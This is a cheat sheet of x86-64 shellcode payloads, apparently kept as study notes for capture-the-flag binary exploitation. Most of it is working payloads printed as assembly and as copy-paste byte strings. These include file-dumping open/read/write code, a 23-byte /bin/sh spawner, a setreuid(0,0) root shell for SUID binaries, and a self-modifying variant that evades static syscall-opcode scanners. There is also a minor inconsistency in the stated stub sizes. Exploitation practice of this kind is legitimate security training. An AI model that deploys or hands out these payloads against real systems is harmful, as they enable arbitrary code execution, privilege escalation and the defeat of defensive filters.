## Definition
> The **Assembly Shellcode Database** is a centralized reference and repository of battle-tested x86-64 machine code payloads, categorized by exploitation objectives (file exfiltration, shell spawning, privilege escalation) and operational constraints (null-free, opcode-filtered, size-restricted).

---
## Tags 
#Material #BinaryExploitation #Shellcode #Assembly #Payload #CheatSheet 

---
## Tooling & Generation Cheatsheet

### 1. Compile Source to Raw Shellcode
```bash
# Via GCC & objcopy
gcc -nostdlib -static solve.s -o solve.elf
objcopy -O binary --only-section=.text solve.elf payload.bin

# Via NASM (direct flat binary)
nasm -f bin solve.asm -o payload.bin
```

### 2. Quick Python / Pwntools Helper
```python
from pwn import *
context.arch = 'amd64'

# Assemble and output hex / raw bytes
sc = asm('''
    /* Assembly code here */
''')
print(f"Length: {len(sc)} bytes")
print(f"Escaped: {repr(sc)}")
print(f"Hex: {sc.hex()}")
```

### 3. Inspect / Disassemble Hex One-Liner
```bash
python3 -c 'import pwn; pwn.context.arch="amd64"; print(pwn.disasm(bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")))'
```

---
## Master Shellcode Index

| # | Purpose | Type / Constraint | Size | Syscalls Used | Description |
|---|---------|-------------------|------|---------------|-------------|
| 1 | **Cat File / Flag** | Standard ORW (Labels) | ~65 B | `open`, `read`, `write`, `exit` | Standard bare-metal file reader using stack buffer |
| 2 | **Cat File / Flag** | Null-Free ORW | ~67 B | `open`, `read`, `write`, `exit` | Free of `\x00` bytes; uses `jmp-call-pop` and stack math |
| 3 | **Cat File / Flag** | Syscall-Smuggled (SMC) | ~89 B | Smuggled `open`, `read`, `write`, `exit` | Bypasses `0f05`, `0f34`, and `cd80` static scanners via SMC |
| 4 | **Cat File / Flag** | Sendfile Fast ORW | 50 B | `open`, `sendfile`, `exit` | Ultra-short file dumper using kernel pipe (`sendfile`) |
| 5 | **Spawn Shell** | Minimal `/bin/sh` | **23 B** | `execve` | Ultra-compact, 100% null-free interactive shell |
| 6 | **Root Shell** | SUID Drop (`setreuid(0,0)`) | 36 B | `setreuid`, `execve` | Sets real/effective UID to root before executing `/bin/sh` |
| 7 | **Auxiliary** | Clean `sys_exit(0)` | 9 B | `exit` | Terminate process gracefully without segfault |

---
## 1. File Exfiltration Payloads (Open - Read - Write)

### 1.1 Standard Bare-Metal ORW
- **Objective:** Read `/flag` and print content directly to `stdout`.
- **Constraint:** Uses `RIP-Relative` addressing. Requires file path at label.

```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", O_RDONLY=0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    syscall

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    # 3. write(1, rsp, count)
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    syscall

flag_path:
    .string "/flag"
```

---

### 1.2 Null-Free ORW (`\x00`-Free)
- **Objective:** Avoid all null bytes (`\x00`) so payload passes string terminators (`strcpy`, `scanf`, etc.).
- **Trick:** Uses 32-bit registers, `sub sp, 0xfef` for stack buffer, and negative stack offsets.

```perl
perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67"'
```

---

### 1.3 Syscall-Smuggled ORW (Self-Modifying Code)
- **Objective:** Evade static opcode filters scanning for `0f05` (`syscall`), `0f34` (`sysenter`), and `80cd` / `cd80` (`int 0x80`).
- **Mechanism:** Replaces each `syscall` with `inc byte ptr [rip]` followed by `.byte 0x0e, 0x05`. Dynamically patches `0x0e` $\rightarrow$ `0x0f` right before execution.

```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", 0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 3. write(1, rsp, count)
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    inc byte ptr [rip]
    .byte 0x0e, 0x05

flag_path:
    .string "/flag"
```

---

### 1.4 Sendfile Shortcut ORW (Fast & Short)
- **Objective:** Dump file content directly to `stdout` in only **2 syscalls** (`open` + `sendfile`) instead of `open` + `read` + `write`.
- **Syscall ID:** `sendfile` = `40` (`0x28`). Arguments: `sendfile(out_fd=1, in_fd=rax, offset=0, count=0x100)`.

```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", 0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    push 2
    pop rax
    syscall

    # 2. sendfile(out_fd=1, in_fd=rax, offset=0, count=0x100)
    mov rsi, rax        # in_fd (from open)
    push 1
    pop rdi             # out_fd = 1 (stdout)
    xor rdx, rdx        # offset = NULL (0)
    mov r10, 0x100      # count = 256 bytes
    push 40
    pop rax             # rax = 40 (sys_sendfile)
    syscall

    # 3. exit(0)
    push 60
    pop rax
    xor rdi, rdi
    syscall

flag_path:
    .string "/flag"
```

---
## 2. Interactive Shell Payloads (`execve`)

### 2.1 Minimal 64-bit `execve("/bin/sh", 0, 0)` (23 Bytes, Null-Free)
- **Length:** 23 bytes.
- **Null-Free:** Yes.
- **How it works:** Pushes string `//bin/sh` (8 bytes) onto the stack, sets `RDI = RSP`, clears `RSI` and `RDX` via `cdq` sign extension, loads `RAX = 59`, and executes `syscall`.

```asm
.intel_syntax noprefix
.global _start

_start:
    xor rsi, rsi                    # rsi = NULL (argv)
    push rsi                        # Push null terminator
    mov rdi, 0x68732f2f6e69622f      # "//bin/sh" in reverse (little-endian)
    push rdi
    push rsp
    pop rdi                         # rdi = pointer to "//bin/sh"
    push 59
    pop rax                         # rax = 59 (sys_execve)
    cdq                             # rdx = 0 (envp)
    syscall
```

**Raw Escaped Bytes (Copy-Paste Ready):**
```python
b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

**Perl One-Liner:**
```bash
perl -e 'print "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"'
```

---

### 2.2 SUID Privilege Escalation Shell (`setreuid(0, 0)` + `execve`)
- **Objective:** When exploiting a SUID root binary, privileges must be explicitly elevated before spawning `/bin/sh`, otherwise Bash drops permissions.
- **Length:** 36 bytes (100% Null-Free).

```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. setreuid(0, 0)
    xor rdi, rdi                    # rdi = 0 (ruid)
    xor rsi, rsi                    # rsi = 0 (euid)
    push 113
    pop rax                         # rax = 113 (sys_setreuid)
    syscall

    # 2. execve("//bin/sh", 0, 0)
    xor rdx, rdx
    push rdx
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    xor rsi, rsi
    push 59
    pop rax
    syscall
```

**Raw Escaped Bytes:**
```python
b"\x48\x31\xff\x48\x31\xf6\x6a\x71\x58\x0f\x05\x48\x31\xd2\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x48\x31\xf6\x6a\x3b\x58\x0f\x05"
```

---
## 3. Auxiliary Stubs & Building Blocks

### 3.1 NOP Sled Generator
```python
# 100-byte NOP Sled + Shellcode
payload = b"\x90" * 100 + shellcode
```

### 3.2 Clean Exit Stub (`sys_exit(0)`)
```asm
xor rdi, rdi    # rdi = 0
push 60
pop rax         # rax = 60
syscall
```
Hex: `\x48\x31\xff\x6a\x3c\x58\x0f\x05` (8 bytes, Null-Free).

### 3.3 SMC In-Place Patching Primitive
```asm
inc byte ptr [rip]
.byte 0x0e, 0x05    # Becomes 0x0f 0x05 (syscall)
```
Hex: `\xfe\x05\x00\x00\x00\x00\x0e\x05` (8 bytes).

---
## Related Concepts : 
[[Writing Assembly Code]], [[Self-Modifying Code]], [[RIP-Relative Addressing]], [[Basic Shellcode]], [[NOP Sled]], [[Buffer Overflow]], [[pwntools]]
